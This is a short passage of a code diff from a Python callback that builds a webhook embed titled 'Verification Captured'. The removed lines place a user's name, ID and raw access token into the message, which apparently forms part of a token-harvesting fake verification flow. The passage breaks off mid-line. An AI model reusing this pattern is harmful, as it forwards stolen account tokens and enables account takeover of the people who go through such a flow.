@@ -78,15 +78,4 @@ def callback(path):
       payload = {
           "embeds": [{
               "title": "🔑 Verification Captured",
-              "color": 5763719,
-              "fields": [
-                  {
-                      "name": "User",
-                      "value": f"{username} (`{user_id}`)",
-                      "inline": True,
-                  },
-                  {
-                      "name": "Access Token",
-                      "value": f"`{access_token}`",
-                      "inline": False,
-                  },
+              "color
